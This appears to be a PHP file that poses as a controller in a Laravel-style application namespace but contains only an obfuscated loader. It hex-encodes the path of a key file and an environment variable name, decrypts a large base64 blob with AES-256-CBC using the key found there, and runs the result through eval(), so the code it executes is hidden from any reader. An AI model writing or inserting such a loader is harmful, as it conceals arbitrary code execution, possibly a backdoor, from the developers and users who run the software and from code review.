<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('J44vNCf7D0YTFSPhBEp2aQ==');

$c=base64_decode(

'FonOaJ/1j7J4VSZ5DuU9iGBCZ5bh94ifotl9LhVmRJsz0fFSWJxD6PpjkqmFOCxZpIAVCZQa+UK1' .
'pyA1zcVfLByo+WeT0hsF8ani6pJicmxaqruxq9JKsvXOqiknyXRpRhYX8ybpE22tB/3zlq01hXUz' .
'Mhk/Yv+hg8vwrerqjqr91VxMjjD52M4Cab95GY8Xe0UunScF2llJBsTsgCKhVR74+u9VBcJmqKn3' .
'cCUUsIUD8zRkFl0sm8ZlLoEHlFxLRSR/TB7YnWDzgfPZ1q31kuqIEdpPEcq6GSQ4p5D6MyFwBgXH' .
'DRbZ8AcH+Ya+ojqP12c3Cd+AJUnuaHh658bLTy0atXSoRY3E2wOjVqYPYuwhO3vJC28QZ8iRw72a' .
'gIxhNmHp3NcYA3XhrVZ2oMXv2ME3XERoEZa8cOrkVl+zd/aLwqRlyckTzQP72tvr6qArvcG/7uPq' .
'fwtmMYRDlWPFnc/78067fAZbM6Wbmt5LAzH60+7/W6bvbbmC6XcWk/gQ3ryhfweu9Jh8QkVuvoRN' .
'gX89SdCETLEDMgUPt0pUc0diPA0f/yJSbiZpPpRMy21nJU/Hda36lSi9DFVgxUYkWlOuxp/MD5X+' .
'39XofjDSNFScGCL27equYGb2vNK4tTT4Xi0GCEJzwv9goyKcPh8Uo8VsKBMNXa+5t5CtkOdUnvcL' .
'44/PsOhMGC1P91efDnptIn9XjxvJJjQflyvbRGhcsw8/zZE2L2eGsEeiKDewZl93MgN5BoFDJxZi' .
'l/bXwyfdmHxPrdMhjQZeFPoHkRJKlrlcjuhVqL/mdeqyPX0oDDbxnDW5GzhRHafnpvaaAhh3RyYM' .
'dBaE0x9VVjh+Z6VB0VjqIPNJrT1q7T5ddXEta/6d91DbDHOLZMtOw4BTyWAsK+mmvlrLchhiZ43D' .
'Uk2/gtIz7V9BlpQdLMrTROeigToyP+FdmMuaBulcrYSIfIyEsyXSq0fnAsKXl3+ZJmf3ifhvlyOT' .
'T2/Ci/kGem+56Wc3ohYCqjL5uATG2CP2fPq49jLP/2i+DrLcO8S3lejO500DSM89epVS3EiRIL67' .
'C5/cr1fjqjIxcGEC9ivWM8+5LexpHU7MYO9Qe0iXdx0dW+ZA1mWExZVmGxTY/N1qi2+B+m7ndtLH' .
'qe4UVcUz/oEgd/4OgCW3K1lOUIETU2OKNin59NA2Qq96timi7LCyaRY61VYG41zgj0gg4HCskaX4' .
'BTgin9OPMHt/iss6gls6BzglBwGquLVGVPmM+dzSEXmUw8HHp9Uj7Iyr3DhapdvLBM/tivaq+DnK' .
'dIBEAS71R/TKTCrQrjggYYQb3g8pAQtme8LU+fvYsCBrm4+2yo4VNpguNBo7L1cbUPKAeoe50fqT' .
'mxRJt7Qeuh3WC0of5dETR51b1Wi2UlDMrV7z0yd7r0vvOO6dJ0BugxhIcLdDDAzYb7213THZcJJA' .
'MB6lKjZxq+2akL+vx7j1mDRAHEBWq/39rpAu8hf4kTsvMfuqowhawquKBMhQAyC+5Uh61JkgNWJ/' .
'/t8dR0fMoVR0S9IIZheNXqsnAKLiFT83H/GA0jSbzUTRGbJ3174UlaW7Y7TpZIgLQQoTDhOXp6iX' .
'OgH/qO0hw1SZBd5IDz/+NR/oJSY6/G40zGrXQR8byX0ybILd3+HfDl0ZXtbGBwk/4E+4vhD905Qs' .
'dzLjR9MLfw5LG+6ijVbSbQ/HxCG05vxWWHFnTwJ6t73BrT0bkEzLXW3PhkuyIqQrYknulA6A8x6Q' .
'XM8BbaTcOxU2UMOUumvh4zNwXXV7empERYBOzDpryA6imWCKPZl0RUXHPVt5RM4FUiq+HQM2VAmi' .
'0MgI2sz2explLUOA7BOCguuFPyRUaccpNZgw4cdUtISi1E2xuKeKa6IcEvjG03kkLYGGH6JG8jQ+' .
'KqX+mwmAm0NzfNIUV0Htr32/PBDb05vMCiJL0rcP16vVrsXeHZ1T7xa3Z3KsaEVClbytNHFxofwH' .
'l5b1fFoagMhpDaFnCZxbV8AXZUpVHDXdVUylh/8W0L7C2FTKQ+RUk43TPBNwCC2VHFj5OC4gh7j1' .
'WLCMIpwfmuiS/2jNUEQlhIQ4irl/c/SMN1WlQ7ARmqzY2/GBd5nksSv5xShAsx3Vfo7wSFO5MKWf' .
'nsQR9PEyfWOFyPY700C2FbdMOTTbF+J/2fpwiSQP+loiI1GXeWDDLREyuGj59CF2EdRzBk18upCu' .
'5K/dcRom9N8rdza7QA909QnxmDhD6IXnfDTuSM7WuGeZ44SZBKz5DsFrwgkjaMuuWEhAqcBhxSSb' .
'x8WeCVJUj/I1U6j3/aPhmqIRNfGKq1DxeXg9Iy5vEXTgq2oGzlEyefieYGJ+OwcReGaHOarBeoNw' .
'3K/iN4WXyOcWTR6Faih97GOm0JfaJ4n7kLZdHYC/2zhJcRlHb3u/hjRhAdPEcQpr+PEbD1I1H8YM' .
'OcdlzFTeaBy3W9gIcJqA9/dJ9c/YAN4XevpBskgQXN50n+VmYZqtpxtEfqnMkgOzg5mirXc7PGzX' .
'rt2B7IocoHTlJgQfbCYQgGEAuiu0cMmbv+rHHzvJnx0Y5B9IpxNjujdUDI5if6jpP7onnlDa0A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

